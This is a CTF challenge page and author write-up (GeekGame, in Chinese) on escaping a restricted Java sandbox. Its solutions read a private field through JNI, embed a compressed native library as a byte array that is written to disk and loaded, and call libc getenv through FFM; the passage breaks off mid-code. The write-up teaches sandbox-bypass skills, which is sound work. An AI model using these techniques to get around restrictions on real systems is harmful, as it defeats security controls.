# [Binary] 7 岁的毛毛：我要写 Java

- 命题人：MaxXing
- 爪哇蛋羹：150 分
- 爪哇西兰花：200 分
- 爪哇羊腿：200 分

## 题目描述

<blockquote>
<p>作者：爪哇品味早读</p>
</blockquote>
<p>7 岁的毛毛一打开 GeekGame，就直接冲向主理人小圆，抱住她的大腿哭了起来。毛毛突如其来的举动，一下子让小圆懵在了原地：这孩子也没被封号啊，这是怎么一回事呢？</p>
<p>原来，毛毛妈妈近期看到了同事带鱼屏上长到吐血的 Java 类名，随口跟家人说：“要不这次 GeekGame 别出 Java 题了，多整点 Rust。”</p>
<p>随意的一句话，却被一旁的毛毛听了去。</p>
<p>毛毛哭着、闹着，输出了 2GB 的 GC log，就是要做 Java 题，哪怕妈妈用“蟒蛇”“去”，转移注意力，他也死死抵住诱惑，坚持要实例化工厂类。这是他与 Java 的“约定”。</p>
<p>后来，毛毛妈妈想通了，自己的孩子从 -2147483648 岁就写 Java，<code>Float.NaN</code> 年来从没泄漏过任何内存，更没抛出过一次 <code>NullPointerException</code>，不该因大家觉得不爽就不在 binary 分类里出 Java 题。</p>
<p>这份从“-2147483648 岁到 7 岁”的陪伴，早已不是简单的“打 CTF”，而是孩子成长中的 hot path，也是家长心里对 Java（特指 Java 8）的信任。</p>
<hr>
<p><b>【Flag 1：爪哇蛋羹】</b></p>
<p><strong>提交 Java 代码，读取 <code>Flag1</code> 类中保存了 Flag 的私有字段。</strong></p>
<p>注意：你不能调用任何和反射相关的方法（<code>Class.*</code> 和 <code>MethodHandles.*</code>）。</p>
<p><b>【Flag 2：爪哇西兰花】</b></p>
<p><strong>提交 Java 代码，读取环境变量中的 Flag。</strong></p>
<p>注意：你不能调用任何和反射、类加载器（<code>ClassLoader.*</code>）、系统和运行时（<code>System.*</code> &amp; <code>Runtime.*</code>）、进程执行（<code>ProcessBuilder.*</code>）相关的方法。</p>
<p><b>【Flag 3：爪哇羊腿】</b></p>
<p><strong>提交 Java 代码，利用 JNI 函数读取 Flag。</strong></p>
<p>注意：对于以下内容：</p>
<ul>
<li>反射（<code>Class.*</code>, <code>MethodHandles.*</code>, <code>MethodHandle.*</code>）</li>
<li>类加载器（<code>ClassLoader.*</code>）</li>
<li>系统和运行时（<code>System.*</code> &amp; <code>Runtime.*</code>）</li>
<li>进程执行（<code>ProcessBuilder.*</code>）</li>
<li>FFM（<code>Linker.*</code> &amp; <code>SymbolLookup.*</code>）</li>
</ul>
<p>你不能调用其方法、读写其字段，或获取其对应的类对象。</p>
<hr>
<p>评测机将使用 Temurin 25.0.0+36 版本的 JDK 执行你的 Java 代码。</p>
<p>更多细节请参考附件和题目源码。</p>
<div class="well">
<p><strong>第二阶段提示：</strong></p>
<ul>
<li><strong>Flag 1</strong>：JNI 可以<a target="_blank" rel="noopener noreferrer" href="https://docs.oracle.com/en/java/javase/25/docs/specs/jni/functions.html#accessing-fields-of-objects">读取 Java 对象的字段</a>，无论其是否为 private。</li>
<li><strong>Flag 2</strong>：Java 的 FFM 特性可以<a target="_blank" rel="noopener noreferrer" href="https://dev.java/learn/ffm/native/">调用 libc 中的函数</a>。</li>
<li><strong>Flag 3</strong>：此题的 JNI 部分向 Java 部分泄露了栈地址（保存在 <code>Flag3</code> 类的 <code>sysInfoSegment</code> 字段中），做一次 heap dump 即可获得。当然，此题还有很多其他解法，例如绕过 Java agent 对题目中禁止调用方法的限制。</li>
</ul>
</div>

**[【附件：下载题目附件（binary-java-attachment.zip）】](attachment/binary-java-attachment.zip)**

**[【附件：下载题目源码（binary-java-src.zip）】](attachment/binary-java-src.zip)**

**【终端交互：连接到题目】**

## 预期解法

——这次实在是没活了。

xmcp 说：要有 Java 的 binary 题，于是有了这道题。

然而这道题似乎并不难（虽然没多少人做），而且很容易被 AI 做出来。

以及，在出题的时候我就觉得，这个题应该会有非常多的非预期解。出题人的脑回路有时看起来比较弱智，以下解法仅供图一乐。

> [!NOTE]
> 预期解法的详细实现见 [sol 目录](./sol)。

### Flag 1

用 JNI 提供的 `GetFieldID` 获取传入对象中 `flag` 字段的 ID，之后使用 `GetObjectField` 读出 `flag` 字段中的字符串对象即可：

```c
JNIEXPORT jstring JNICALL Java_Solution_getFlag(JNIEnv *env, jclass cls, jobject obj) {
  jclass flagClass = (*env)->GetObjectClass(env, obj);
  jfieldID flagFieldID = (*env)->GetFieldID(env, flagClass, "flag", "Ljava/lang/String;");
  jstring flag = (jstring)(*env)->GetObjectField(env, obj, flagFieldID);
  return flag;
}
```

唯一需要绕一下的地方：你只能提交 Java 程序，所以你需要把 JNI 对应的 shared library 一起打包到文本格式的程序里。这个解采用的做法是用 zlib 压缩 so 文件，然后直接在 Java 代码里嵌入压缩后的 bytes。

```java
import module java.base;

public class Solution {
  public static void solve(Object f) throws Exception {
    System.out.println(getFlag(f));
  }

  static native String getFlag(Object f);

  static final byte[] compressed = new byte[]{
    (byte)0x78, (byte)0xda, (byte)0xed, (byte)0x5b, (byte)0x5d, (byte)0x68, (byte)0x1c, (byte)0x55, (byte)0x14, (byte)0xbe, (byte)0xb3, (byte)0x3f, (byte)0xcd, (byte)0xb4, (byte)0x49, (byte)0x76,
    (byte)0x57, (byte)0x49, (byte)0x71, (byte)0x6d, (byte)0x4a, (byte)0xb3, (byte)0x48, (byte)0x03, (byte)0xc6, (byte)0xda, (byte)0x49, (byte)0x9a, (byte)0x34, (byte)0x62, (byte)0x0d, (byte)0x49,
    (byte)0xb6, (byte)0xc4, (byte)0x26, (byte)0x63, (byte)0x6d, (byte)0xa4, (byte)0x36, (byte)0xd9, (byte)0x07, (byte)0xad, (byte)0x65, (byte)0x9c, (byte)0x64, (byte)0x27, (byte)0xbb, (byte)0xdb,
    (byte)0xee, (byte)0x9f, (byte)0xb3, (byte)0xb3, (byte)0xed, (byte)0xa6, (byte)0x60, (byte)0x0d, (byte)0x44, (byte)0x0b, (byte)0x6b, (byte)0x88, (byte)0xc4, (byte)0x37, (byte)0x1f, (byte)0x04,
    (byte)0xfb, (byte)0x54, (byte)0xf7, (byte)0xd1, (byte)0x0a, (byte)0xbe, (byte)0xf4, (byte)0x29, (byte)0xb1, (byte)0x35, (byte)0x04, (byte)0x11, (byte)0x69, (byte)0x11, (byte)0xc5, (byte)0x97,
    (byte)0x62, (byte)0x40, (byte)0x0b, (byte)0x51, (byte)0xb4, (byte)0x46, (byte)0x44, (byte)0x89, (byte)0x0a, (byte)0x19, (byte)0xef, (byte)0xcc, (byte)0x9c, (byte)0xbb, (byte)0x99, (byte)0xb9,
    (byte)0xcd, (byte)0x64, (byte)0x4b, (byte)0x11, (byte)0xea, (byte)0xc3, (byte)0xfd, (byte)0x60, (byte)0xe6, (byte)0x9b, (byte)0x73, (byte)0xee, (byte)0xfd, (byte)0xee, (byte)0x99, (byte)0xb9,
    (byte)0x3f, (byte)0xb3, (byte)0x2c, (byte)0x73, (byte)0xee, (byte)0x1b, (byte)0x47, (byte)0x8e, (byte)0x0d, (byte)0x7a, (byte)0x38, (byte)0x0e, (byte)0x11, (byte)0x78, (byte)0x51, (byte)0x1f,
    (byte)0xda, (byte)0xb0, (byte)0x10, (byte)0x8a, (byte)0x02, (byte)0xf3, (byte)0x07, (byte)0xec, (byte)0xbe, (byte)0xa7, (byte)0x51, (byte)0x3d, (byte)0x3e, (byte)0x87, (byte)0xd1, (byte)0x23,
    (byte)0x66, (byte)0x5d, (byte)0x1f, (byte)0x72, (byte)0xc7, (byte)0xbc, (byte)0xcf, (byte)0xc9, (byte)0x28, (byte)0x64, (byte)0x91, (byte)0xa1, (byte)0xf3, (byte)0xdb, (byte)0x6c, (byte)0x9a,
    (byte)0x65, (byte)0xce, (byte)0xc9, (byte)0x76, (byte)0x9d, (byte)0xd9, (byte)0x54, (byte)0x04, (byte)0xfc, (byte)0x14, (byte)0x5f, (byte)0x47, (byte)0x4e, (byte)0xb6, (byte)0xeb, (byte)0xb6,
    (byte)0xe1, (byte)0x23, (byte)0x29, (byte)0x58, (byte)0x76, (byte)0xb2, (byte)0xcf, (byte)0xc9, (byte)0x97, (byte)0x20, (byte)0x4e, (byte)0x85, (byte)0x8a, (byte)0xe7, (byte)0x01, (byte)0x5d,
    (byte)0x09, (byte)0x74, (byte)0xa5, (byte)0x3e, (byte)0x27, (byte)0x1f, (byte)0xe7, (byte)0x9c, (byte)0xcc, (byte)0x83, (byte)0xdc, (byte)0x07, (byte)0x47, (byte)0xc5, (byte)0x03, (byte)0xed,
    (byte)0x52, (byte)0x4c, (byte)0xdf, (byte)0x3e, (byte)0xad, (byte)0x5b, (byte)0x82, (byte)0x7a, (byte)0x34, (byte)0xef, (byte)0x45, (byte)0x4e, (byte)0x26, (byte)0xdd, (byte)0x3a, (byte)0x72,
    (byte)0x5b, (byte)0x8b, (byte)0xdf, (byte)0x4f, (byte)0xbc, (byte)0xe3, (byte)0xa0, (byte)0x0b, (byte)0x43, (byte)0x01, (byte)0xcd, (byte)0x6e, (byte)0xf1, (byte)0x5e, (byte)0xc4, (byte)0xba,
    (byte)0x6d, (byte)0xe8, (byte)0xde, (byte)0x41, (byte)0x86, (byte)0xf7, (byte)0x04, (byte)0xc4, (byte)0x73, (byte)0x1b, (byte)0x87, (byte)0xf7, (byte)0x38, (byte)0x27, (byte)0x73, (byte)0xb6,
    (byte)0xb8, (byte)0x21, (byte)0x98, (byte)0x33, (byte)0x43, (byte)0x2f, (byte)0xc4, (byte)0x8c, (byte)0x71, (byte)0x31, (byte)0xa7, (byte)0x94, (byte)0xd7, (byte)0x56, (byte)0xde, (byte)0x04,
    (byte)0xb6, (byte)0x51, (byte)0xfe, (byte)0x43, (byte)0xf0, (byte)0xe3, (byte)0x0f, (byte)0xea, (byte)0x5f, (byte)0x9b, (byte)0x7e, (byte)0x79, (byte)0xfe, (byte)0xb7, (byte)0x4b, (byte)0x97,
    (byte)0xbf, (byte)0xff, (byte)0xf0, (byte)0xa7, (byte)0x96, (byte)0xf5, (byte)0xb6, (byte)0x5b, (byte)0xb3, (byte)0x64, (byte)0x3c, (byte)0xfd, (byte)0xb6, (byte)0xf9, (byte)0x60, (byte)0x35,
    (byte)0xcb, (byte)0x5b, (byte)0x73, (byte)0x11, (byte)0xe3, (byte)0x56, (byte)0x43, (byte)0xeb, (byte)0x95, (byte)0xad, (byte)0x9e, (byte)0x63, (byte)0xd0, (byte)0xd6, (byte)0x87, (byte)0x76,
    (byte)0x3c, (byte)0xe9, (byte)0xe2, (byte)0x0f, (byte)0xb9, (byte)0xf8, (byte)0x39, (byte)0x17, (byte)0x7f, (byte)0x0c, (byte)0x1f, (byte)0x0f, (byte)0xa3, (byte)0x1d, (byte)0x08, (byte)0x3d,
    (byte)0x64, (byte)0xd9, (byte)0xa3, (byte)0xa4, (byte)0x40, (byte)0x92, (byte)0x12, (byte)0x99, (byte)0x5c, (byte)0x56, (byte)0x2a, (byte)0x68, (byte)0xb2, (byte)0xaa, (byte)0x49, (byte)0x12,
    (byte)0x92, (byte)0x9e, (byte)0x1b, (byte)0x1d, (byte)0x96, (byte)0xe2, (byte)0x8a, (byte)0xaa, (byte)0x24, (byte)0x52, (byte)0x05, (byte)0x4d, (byte)0x51, (byte)0x47, (byte)0x87, (byte)0x07,
    (byte)0xd2, (byte)0xb9, (byte)0xac, (byte)0x32, (byte)0x2a, (byte)0x8f, (byte)0xa5, (byte)0x15, (byte)0xab, (byte)0x6c, (byte)0xf3, (byte)0x12, (byte)0x69, (byte)0xbc, (byte)0x24, (byte)0x4b,
    (byte)0x13, (byte)0xa9, (byte)0xac, (byte)0x9c, (byte)0x4e, (byte)0x9d, (byte)0x57, (byte)0xd0, (byte)0x51, (byte)0xf9, (byte)0xac, (byte)0x2c, (byte)0x8d, (byte)0xe4, (byte)0xd2, (byte)0x45,
    (byte)0x2d, (byte)0x85, (byte)0x9b, (byte)0x4e, (byte)0x28, (byte)0xda, (byte)0x60, (byte)0x5a, (byte)0x4e, (byte)0x38, (byte)0xc7, (byte)0x83, (byte)0xcc, (byte)0x93, (byte)0x55, (byte)0x18,
    (byte)0xc0, (byte)0x3c, (byte)0xe5, (byte)0xff, (byte)0x28, (byte)0xe4, (byte)0x7c, (byte)0x51, (byte)0xf0, (byte)0xd4, (byte)0x8b, (byte)0x63, (byte)0xa9, (byte)0xdf, (byte)0xe2, (byte)0x6d,
    (byte)0xb6, (byte)0xb1, (byte)0x34, (byte)0x70, (byte)0xc3, (byte)0xe6, (byte)0xf7, (byte)0xd8, (byte)0xfc, (byte)0xdf, (byte)0xda, (byte)0xfc, (byte)0x5e, (byte)0x9b, (byte)0x7f, (byte)0xd9,
    (byte)0xe6, (byte)0xf7, (byte)0x21, (byte)0x06, (byte)0x06, (byte)0x06, (byte)0x06, (byte)0x06, (byte)0x06, (byte)0x06, (byte)0x06, (byte)0x06, (byte)0x06, (byte)0x86, (byte)0xfb, (byte)0xc1,
    (byte)0xef, (byte)0xc1, (byte)0x3d, (byte)0x7f, (byte)0x8b, (byte)0xd3, (byte)0x3f, (byte)0xf3, (byte)0xe2, (byte)0x8c, (byte)0xff, (byte)0x66, (byte)0x3b, (byte)0x42, (byte)0xe2, (byte)0x5b,
    (byte)0xf3, (byte)0x9a, (byte)0x47, (byte)0xbf, (byte)0x21, (byte)0x4e, (byte)0x5f, (byte)0xe7, (byte)0xaf, (byte)0x99, (byte)0xe5, (byte)0x7a, (byte)0xf7, (byte)0xe7, (byte)0xd8, (byte)0xad,
    (byte)0xb7, (byte)0x7e, (byte)0x81, (byte)0xcf, (byte)0xc1, (byte)0x96, (byte)0xa8, (byte)0x59, (byte)0x5f, (byte)0x6f, (byte)0x7d, (byte)0x07, (byte)0x5b, (byte)0x13, (byte)0xc1, (byte)0x96,
    (byte)0x67, (byte)0xb1, (byte)0x60, (byte)0xb6, (byte)0x77, (byte)0xc1, (byte)0xd0, (byte)0xcd, (byte)0xfa, (byte)0xaf, (byte)0x1a, (byte)0x74, (byte)0x68, (byte)0x4d, (byte)0xdb, (byte)0x89,
    (byte)0x9b, (byte)0xba, (byte)0x00, (byte)0x4d, (byte)0x6d, (byte)0xd7, (byte)0x97, (byte)0x83, (byte)0x2d, (byte)0x53, (byte)0x46, (byte)0x3b, (byte)0xd7, (byte)0x80, (byte)0x71, (byte)0xfd,
    (byte)0x77, (byte)0xcd, (byte)0xfa, (byte)0xdd, (byte)0x6f, (byte)0x1b, (byte)0xd4, (byte)0xb6, (byte)0x2e, (byte)0x96, (byte)0x57, (byte)0xc5, (byte)0x85, (byte)0x3b, (byte)0xfd, (byte)0xe2,
    (byte)0xc2, (byte)0x9a, (byte)0x57, (byte)0xe4, (byte)0x16, (byte)0xc5, (byte)0x9b, (byte)0xeb, (byte)0x5a, (byte)0x13, (byte)0x6e, (byte)0xa0, (byte)0x1b, (byte)0x1a, (byte)0xe0, (byte)0xf5,
    (byte)0x65, (byte)0x2b, (byte)0x0e, (byte)0xd1, (byte)0x1b, (byte)0xf1, (byte)0xa7, (byte)0x7a, (byte)0x87, (byte)0x71, (byte)0x31, (byte)0x2a, (byte)0xee, (byte)0x8b, (byte)0x89, (byte)0xd3,
    (byte)0xbd, (byte)0x1e, (byte)0xe3, (byte)0x52, (byte)0x2c, (byte)0xdf, (byte)0xd6, (byte)0x1a, (byte)0xc4, (byte)0x99, (byte)0x5e, (byte)0x01, (byte)0x1b, (byte)0x2b, (byte)0x2f, (byte)0xe9,
    (byte)0xba, (byte)0xbe, (byte)0x12, (byte)0xc7, (byte)0xa7, (byte)0x45, (byte)0x7f, (byte)0x2b, (byte)0xb6, (byte)0xb9, (byte)0x53, (byte)0x58, (byte)0xeb, (byte)0xd0, (byte)0xff, (byte)0x78,
    (byte)0x0e, (byte)0x17, (byte)0xda, (byte)0xec, (byte)0x98, (byte)0x58, (byte)0xfe, (byte)0x46, (byte)0x2c, (byte)0x7f, (byte)0x3d, (byte)0x22, (byte)0x96, (byte)0xff, (byte)0xb1, (byte)0xba,
    (byte)0xa2, (byte)0x4e, (byte)0x9f, (byte)0x5b, (byte)0x33, (byte)0x5b, (byte)0xfd, (byte)0x4e, (byte)0x9c, (byte)0xdd, (byte)0xf9, (byte)0x4b, (byte)0xc0, (byte)0xb8, (byte)0xdd, (byte)0xc6,
    (byte)0xaf, (byte)0x0c, (byte)0x2a, (byte)0x2f, (byte)0x8a, (byte)0x33, (byte)0x5e, (byte)0x7d, (byte)0x6e, (byte)0xd5, (byte)0x63, (byte)0x5c, (byte)0xdf, (byte)0x31, (byte)0xca, (byte)0xcb,
    (byte)0x9f, (byte)0x62, (byte)0x8f, (byte)0x38, (byte)0x33, (byte)0xb5, (byte)0x66, (byte)0xb8, (byte)0x70, (byte)0xaf, (byte)0x9d, (byte)0x3c, (byte)0xa5, (byte)0x2f, (byte)0x57, (byte)0xfb,
    (byte)0xb4, (byte)0xda, (byte)0x8b, (byte)0x0c, (byte)0x0c, (byte)0x0c, (byte)0x0c, (byte)0x0c, (byte)0x0c, (byte)0x0c, (byte)0x0c, (byte)0x0c, (byte)0x0c, (byte)0x0c, (byte)0x0c, (byte)0x0c,
    (byte)0x0c, (byte)0x0f, (byte)0x16, (byte)0xc7, (byte)0x4e, (byte)0xcb, (byte)0x67, (byte)0xe5, (byte)0xf6, (byte)0xb4, (byte)0x9c, (byte)0x4d, (byte)0xb4, (byte)0x8f, (byte)0x68, (byte)0x6a,
    (byte)0x2a, (byte)0x9b, (byte)0xe8, (byte)0x41, (byte)0x13, (byte)0xc6, (byte)0x47, (byte)0x40, (byte)0xae, (byte)0xd9, (byte)0xdb, (byte)0x63, (byte)0x7c, (byte)0xf3, (byte)0x35, (byte)0xbe,
    (byte)0xc1, (byte)0xf1, (byte)0xab, (byte)0xba, (byte)0x1e, (byte)0xc5, (byte)0x1c, (byte)0xc6, (byte)0x9c, (byte)0xc4, (byte)0xbc, (byte)0x82, (byte)0x79, (byte)0x0a, (byte)0xf4, (byte)0x4d,
    (byte)0xc0, (byte)0xdc, (byte)0xf9, (byte)0x13, (byte)0x88, (byte)0x2b, (byte)0x85, (byte)0xb8, (byte)0xe6, (byte)0x86, (byte)0x3a, (byte)0x7e, (byte)0x8e, (byte)0xb3, (byte)0xbe, (byte)0x17,
    (byte)0xef, (byte)0xc6, (byte)0xc7, (byte)0xfc, (byte)0xaf, (byte)0xba, (byte)0x6e, (byte)0x7e, (byte)0x22, (byte)0x0c, (byte)0x84, (byte)0x06, (byte)0x03, (byte)0xe1, (byte)0xa3, (byte)0xc1,
    (byte)0xfa, (byte)0x73, (byte)0xfc, (byte)0x14, (byte)0xea, (byte)0xdf, (byte)0x75, (byte)0xe8, (byte)0x89, (byte)0xae, (byte)0xbd, (byte)0x8f, (byte)0x11, (byte)0x3d, (byte)0xfe, (byte)0x7b,
    (byte)0x8f, (byte)0x2a, (byte)0xa4, (byte)0x1e, (byte)0xc0, (byte)0xd0, (byte)0xbf, (byte)0x82, (byte)0x8f, (byte)0x57, (byte)0x71, (byte)0x2c, (byte)0xf3, (byte)0x1b, (byte)0xe8, (byte)0x91,
    (byte)0x40, (byte)0xe8, (byte)0xa2, (byte)0x67, (byte)0x28, (byte)0x10, (byte)0x9e, (byte)0xf6, (byte)0x0e, (byte)0x05, (byte)0x22, (byte)0xaf, (byte)0x07, (byte)0xc2, (byte)0x87, (byte)0x03,
    (byte)0xa1, (byte)0xc3, (byte)0x01, (byte)0x9e, (byte)0x0d, (byte)0x20, (byte)0x03, (byte)0x03, (byte)0x03, (byte)0x03, (byte)0x03, (byte)0x03, (byte)0x03, (byte)0x03, (byte)0x03, (byte)0x03,
    (byte)0x03, (byte)0xc3, (byte)0xff, (byte)0x0c, (byte)0x24, (byte)0x7f, (byte)0x94, (byte)0xe4, (byte)0x8b, (byte)0x36, (byte)0x90, (byte)0x02, (byte)0xb0, (byte)0x1b, (byte)0xc1, (byte)0x1c,
    (byte)0x85, (byte)0xbc, (byte)0xd7, (byte)0x47, (byte)0xc1, (byte)0x26, (byte)0x79, (byte)0xa8, (byte)0xcd, (byte)0x60, (byte)0x93, (byte)0x7f, (byte)0x7c, (byte)0xbb, (byte)0x80, (byte)0x49,
    (byte)0x3e, (byte)0xea, (byte)0x6e, (byte)0xaa, (byte)0xfc, (byte)0x8f, (byte)0x75, (byte)0x3d, (byte)0x67, (byte)0xc6, (byte)0x85, (byte)0xe4, (byte)0x52, (byte)0x92, (byte)0xdf, (byte)0x5b,
    (byte)0x81, (byte)0xa4, (byte)0x52, (byte)0x92, (byte)0xbb, (byte)0x1c, (byte)0x06, (byte)0x7b, (byte)0x07, (byte)0xd8, (byte)0x67, (byte)0x80, (byte)0xeb, (byte)0x49, (byte)0x39, (byte)0x30,
    (byte)0xc9, (byte)0x45, (byte)0x5d, (byte)0x81, (byte)0x3c, (byte)0xd4, (byte)0x3a, (byte)0x52, (byte)0xee, (byte)0x73, (byte)0xc6, (byte)0xad, (byte)0x00, (byte)0x6f, (byte)0xa7, (byte)0xf4,
    (byte)0x7f, (byte)0xe9, (byte)0xd6, (byte)0xfd, (byte)0x78, (byte)0x1f, (byte)0x50, (byte)0xff, (byte)0x93, (byte)0x7c, (byte)0xf5, (byte)0xbb, (byte)0x10, (byte)0xb5, (byte)0x68, (byte)0x68,
    (byte)0x60, (byte)0xe0, (byte)0x99, (byte)0xc8, (byte)0xe3, (byte)0xb1, (byte)0xb1, (byte)0x62, (byte)0x56, (byte)0x2b, (byte)0x46, (byte)0x0e, (byte)0x74, (byte)0x09, (byte)0x5d, (byte)0x42,
    (byte)0xc7, (byte)0xfe, (byte)0xa7, (byte)0x8a, (byte)0xa6, (byte)0xd9, (byte)0x79, (byte)0xa1, (byte)0xf3, (byte)0xa0, (byte)0xd0, (byte)0x71, (byte)0xb0, (byte)0x0d, (byte)0xdc, (byte)0x08,
    (byte)0x09, (byte)0x85, (byte)0x64, (byte)0x41, (byte)0x53, (byte)0x35, (byte)0x79, (byte)0x0c, (byte)0x09, (byte)0xd9, (byte)0x9c, (byte)0xa6, (byte)0x08, (byte)0x89, (byte)0x6c, (byte)0x51,
    (byte)0xc8, (byte)0xab, (byte)0xb9, (byte)0xbc, (byte)0xa2, (byte)0x6a, (byte)0x93, (byte)0x36, (byte)0xd7, (byte)0x58, (byte)0x31, (byte)0x95, (byte)0x8e, (byte)0xef, (byte)0x4f, (byte)0xc5,
    (byte)0x91, (byte)0x69, (byte)0x25, (byte)0xe5, (byte)0x42, (byte)0x12, (byte)0x09, (byte)0xf1, (byte)0xc9, (byte)0x6c, (byte)0x61, (byte)0x32, (byte)0x63, (byte)0xb1, (byte)0xa6, (byte)0x22,
    (byte)0x41, (byte)0x55, (byte)0xd2, (byte)0xb2, (byte)0x61, (byte)0x20, (byte)0x21, (byte)0x95, (byte)0x4d, (byte)0x69, (byte)0x48, (byte)0xc8, (byte)0xa7, (byte)0x35, (byte)0x21, (byte)0x91,
    (byte)0xc3, (byte)0x17, (byte)0x9a, (byte)0x52, (byte)0xc2, (byte)0xe7, (byte)0x09, (byte)0xec, (byte)0xc5, (byte)0x95, (byte)0x72, (byte)0x71, (byte)0x59, (byte)0x93, (byte)0x91, (byte)0xa0,
    (byte)0x24, (byte)0xa5, (byte)0x09, (byte)0x55, (byte)0xce, (byte)0x28, (byte)0x52, (byte)0x32, (byte)0xae, (byte)0x6e, (byte)0x58, (byte)0x96, (byte)0x54, (byte)0x92, (byte)0x55, (byte)0x55,
    (byte)0x9e, (byte)0xb4, (byte)0x14, (byte)0xe4, (byte)0x1a, (byte)0xb7, (byte)0x2b, (byte)0x67, (byte)0x52, (byte)0xe3, (byte)0xc8, (byte)0x68, (byte)0xd1, (byte)0x68, (byte)0x19, (byte)0x7b,
    (byte)0xcc, (byte)0x76, (byte)0xc6, (byte)0x0a, (byte)0x05, (byte)0x24, (byte)0x8c, (byte)0xe7, (byte)0x32, (byte)0x19, (byte)0x25, (byte)0xab, (byte)0xfd, (byte)0x57, (byte)0xfd, (byte)0x5b,
    (byte)0x0f, (byte)0x73, (byte)0x82, (byte)0xe4, (byte)0x32, (byte)0xbb, (byte)0xe5, (byte)0xdf, (byte)0x23, (byte)0x6a, (byte)0x9e, (byte)0x12, (byte)0xec, (byte)0xa1, (byte)0xf4, (byte)0x6e,
    (byte)0x79, (byte)0xff, (byte)0x04, (byte)0x74, (byte)0x0e, (byte)0xb4, (byte)0xb1, (byte)0x3d, (byte)0xe3, (byte)0x4f, (byte)0x3c, (byte)0xc7, (byte)0x88, (byte)0x9e, (byte)0xcc, (byte)0xfb,
    (byte)0x55, (byte)0x4a, (byte)0xef, (byte)0x73, (byte)0x89, (byte)0xdf, (byte)0x03, (byte)0xcf, (byte)0xe0, (byte)0xa1, (byte)0xd6, (byte)0x05, (byte)0xe1, (byte)0x39, (byte)0xb4, (byte)0xb1,
    (byte)0x8e, (byte)0x38, (byte)0x9b, (byte)0x9e, (byte)0xcc, (byte)0xef, (byte)0x01, (byte)0x98, (byte)0xdb, (byte)0x1e, (byte)0x6a, (byte)0x9d, (byte)0x11, (byte)0x3e, (byte)0x43, (byte)0xc5,
    (byte)0xe3, (byte)0x28, (byte)0xfb, (byte)0x79, (byte)0xb8, (byte)0x37, (byte)0x0f, (byte)0xb5, (byte)0xae, (byte)0x08, (byte)0x57, (byte)0x5c, (byte)0xee, (byte)0x9f, (byte)0xc4, (byte)0x8f,
    (byte)0x21, (byte)0x47, (byte)0x4e, (byte)0xff, (byte)0x5d, (byte)0xfb, (byte)0x49, (byte)0x9a, (byte)0x6b, (byte)0xf4, (byte)0xdf, (byte)0x27, (byte)0x94, (byte)0x3e, (byte)0x12, (byte)0x72,
    (byte)0x72, (byte)0x88, (byte)0xaa, (byte)0x4f, (byte)0x6f, (byte)0x5b, (byte)0x39, (byte)0x49, (byte)0xe9, (byte)0x3b, (byte)0x42, (byte)0x4e, (byte)0xae, (byte)0xa5, (byte)0x8f, (byte)0x53,
    (byte)0xfa, (byte)0x68, (byte)0xc8, (byte)0xc9, (byte)0x4d, (byte)0xdc, (byte)0xe6, (byte)0x7a, (byte)0x82, (byte)0xd3, (byte)0x94, (byte)0x9e, (byte)0xbc, (byte)0x47, (byte)0x09, (byte)0x37,
    (byte)0xd6, (byte)0x78, (byte)0xfe, (byte)0x3c, (byte)0xe8, (byte)0x3b, (byte)0x89, (byte)0x23, (byte)0xe2, (byte)0xe4, (byte)0xb0, (byte)0xcb, (byte)0xf8, (byte)0x11, (byte)0x2e, (byte)0xc1,
    (byte)0x75, (byte)0x75, (byte)0xfc, (byte)0x22, (byte)0x4e, (byte)0xae, (byte)0x35, (byte)0x7f, (byte)0x2f, (byte)0x52, (byte)0xfa, (byte)0x68, (byte)0xc4, (byte)0xc9, (byte)0x6f, (byte)0xd6,
    (byte)0x58, (byte)0x3f, (byte)0xc6, (byte)0xfc, (byte)0x0c, (byte)0xd8, (byte)0xde, (byte)0xaf, (byte)0xd5, (byte)0x7d, (byte)0x25, (byte)0xc2, (byte)0xe6, (byte)0xf5, (byte)0x79, (byte)0x8a,
    (byte)0xdf, (byte)0xc7, (byte)0x47, (byte)0xd0, (byte)0xa6, (byte)0x27, (byte)0xbf, (byte)0x2b, (byte)0xf9, (byte)0x7b, (byte)0xd4, (byte)0x57, (byte)0x90, (byte)0x73, (byte)0xcf, (byte)0x42,
    (byte)0x75, (byte)0x9f, (byte)0x10, (byte)0xe8, (byte)0xc9, (byte)0xfe, (byte)0x20, (byte)0x3f, (byte)0xa5, (byte)0x23, (byte)0xe3, (byte)0x28, (byte)0xc1, (byte)0xf3, (byte)0x13, (byte)0x3d,
    (byte)0xd9, (byte)0x37, (byte)0xb1, (byte)0xd4, (byte)0xbe, (byte)0xf5, (byte)0xfb, (byte)0x83, (byte)0xf0, (byte)0x15, (byte)0x4a, (byte)0x4f, (byte)0x7e, (byte)0xa7, (byte)0x56, (byte)0xda,
    (byte)0x37, (byte)0x1f, (byte)0x3f, (byte)0x5a, (byte)0x7f, (byte)0x95, (byte)0xd2, (byte)0x57, (byte)0x37, (byte)0x7e, (byte)0x75, (byte)0x6c, (byte)0xfd, (byte)0xfc, (byte)0x04, (byte)0xf3,
    (byte)0xe0, (byte)0x23, (byte)0x7a, (byte)0x1e, (byte)0xf4, (byte)0xbc, (byte)0x8b, (byte)0x9e, (byte)0x5e, (byte)0xff, (byte)0x9f, (byte)0x81, (byte)0xaf, (byte)0x83, (byte)0x8e, (byte)0x03,
    (byte)0x8e, (byte)0x7d, (byte)0x35, (byte)0xe6, (byte)0x1f, (byte)0xe7, (byte)0xf2, (byte)0xdb, (byte)0xda, (byte)0x05, (byte)0xfa, (byte)0x2f, (byte)0x6b, (byte)0xc4, (byte)0xff, (byte)0x17,
    (byte)0x20, (byte)0x1f, (byte)0x95, (byte)0xa2
  };

  static {
    var inflater = new Inflater();
    inflater.setInput(compressed);

    var buffer = new byte[4096];
    final var outPath = "/libsolution.so";
    try (var out = new FileOutputStream(outPath)) {
      while (!inflater.finished()) {
        int count = inflater.inflate(buffer);
        out.write(buffer, 0, count);
      }
    } catch (Exception e) {
      throw new RuntimeException(e);
    }

    System.load(outPath);
  }
}
```

### Flag 2

这题本来只有俩 flag，到 flag 2 就结束了。但 Java 能干的事实在太多，刚开局就有两个选手分别用了不同的方法直接从环境变量里把 flag 读了出来……

这个故事告诉我们出完题了不要图省事，一定要用 AI 验一下（

这里我们可以用 FFM 直接调用 libc 里的 `getenv` 来读 `FLAG2` 环境变量：

```java
import module java.base;

public class Solution {
  public static String solve(Object f) throws Throwable {
    var linker = Linker.nativeLinker();
    var getEnv = linker.downcallHandle(
      linker.defaultLookup().findOrThrow("getenv"),
      FunctionDescriptor.of(ValueLayout.ADDRESS, ValueLayout.ADDRESS)
    );
    try (var arena = Arena.ofConfined()) {
      var name = arena.allocateFrom("FLAG2");
